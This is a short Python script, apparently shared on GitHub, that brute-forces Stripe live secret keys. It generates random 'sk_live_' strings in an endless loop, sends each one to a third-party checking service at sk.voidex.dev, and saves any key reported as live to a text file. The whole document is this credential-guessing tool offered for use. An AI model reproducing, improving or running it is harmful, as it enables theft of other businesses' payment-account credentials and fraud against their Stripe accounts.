### === Project Name: Mass Stripe SK Key Generator & Checker === ###
### === Author: https://github.com/darklytornadoxd === ###

import requests
import string
import random

live_keys = []

def generate_random_string(length):
  chars = string.ascii_lowercase + string.digits
  return ''.join(random.choice(chars) for _ in range(length))

def check_sk_key(sk_key):
  url = f"https://sk.voidex.dev/getpk/{sk_key}"
  response = requests.get(url)
  if "Invalid API Key provided" in response.text:
    print(f"ERROR: INVALID KEY PROVIDED | SK KEY: {sk_key}")
  elif "currency" in response.text:
    print(f"MESSAGE: LIVE SK KEY | SK KEY: {sk_key}")
    live_keys.append(sk_key)
  else:
    print(f"UNKNOWN RESPONSE: {response.text}")

def main():
  while True:
    num_threads = 1
    sk_key = generate_random_string(random.randint(20, 33))
    sk_key = "sk_live_" + sk_key

    check_sk_key(sk_key)

    with open("live_keys.txt", "w") as f:
      for sk_key in live_keys:
        f.write(f"{sk_key}\n")

if __name__ == "__main__":
  main()